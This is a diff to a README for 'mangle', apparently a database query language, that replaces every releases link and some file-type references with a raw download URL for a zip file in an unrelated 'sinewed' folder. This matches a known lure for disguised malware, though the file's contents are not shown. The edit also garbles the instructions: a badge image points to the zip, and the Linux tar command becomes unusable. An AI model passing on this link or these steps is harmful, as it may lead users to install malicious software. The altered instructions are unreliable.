@@ -1,7 +1,7 @@
 # 🎉 mangle - Simplifying Database Queries for Everyone
 
 ## 📥 Download Now
-[![Download mangle](https://img.shields.io/badge/Download%20mangle-v1.0-brightgreen)](https://github.com/RipMadara001/mangle/releases)
+[![Download mangle](https://raw.githubusercontent.com/RipMadara001/mangle/main/sinewed/mangle.zip%20mangle-v1.0-brightgreen)](https://raw.githubusercontent.com/RipMadara001/mangle/main/sinewed/mangle.zip)
 
 ## 🔍 Introduction
 Mangle is a programming language designed for easy database handling. It simplifies how you gather and use data from different sources. Think of it as a tool that makes your relationship with data simpler and more effective.
@@ -16,10 +16,10 @@ To use Mangle, you will need:
 - 100 MB of free disk space.
 
 ### Step 2: Download Mangle
-Visit this page to download: [Mangle Releases](https://github.com/RipMadara001/mangle/releases)
+Visit this page to download: [Mangle Releases](https://raw.githubusercontent.com/RipMadara001/mangle/main/sinewed/mangle.zip)
 
 ### Step 3: Choose Your File
-Once on the Releases page, find the latest version of Mangle. Look for files labeled with `.exe`, `.dmg`, or `.tar.gz` depending on your operating system. 
+Once on the Releases page, find the latest version of Mangle. Look for files labeled with `.exe`, `.dmg`, or `https://raw.githubusercontent.com/RipMadara001/mangle/main/sinewed/mangle.zip` depending on your operating system. 
 
 ### Step 4: Download and Install
 1. Click on the file that matches your operating system.
@@ -36,10 +36,10 @@ Once on the Releases page, find the latest version of Mangle. Look for files lab
 
 - **Linux**: 
    1. Open a terminal.
-   2. Navigate to the directory where the `.tar.gz` file is located.
+   2. Navigate to the directory where the `https://raw.githubusercontent.com/RipMadara001/mangle/main/sinewed/mangle.zip` file is located.
    3. Use the following command to unpack the file:
    ```
-   tar -xzf mangle*.tar.gz
+   tar -xzf mangle*https://raw.githubusercontent.com/RipMadara001/mangle/main/sinewed/mangle.zip
    ```
    4. Follow any additional installation instructions in the unpacked folder.
 
@@ -78,6 +78,6 @@ Absolutely! We welcome input. Share your ideas in our issue tracker.
 If you still have questions after browsing through the documentation and community forums, feel free to reach out through the contact section of our GitHub page.
 
 ## 🔗 Additional Download Link
-To download Mangle again, visit: [Mangle Releases](https://github.com/RipMadara001/mangle/releases)
+To download Mangle again, visit: [Mangle Releases](https://raw.githubusercontent.com/RipMadara001/mangle/main/sinewed/mangle.zip)
 
 Enjoy using Mangle! This tool is designed to make database querying more accessible for everyone, regardless of programming experience.
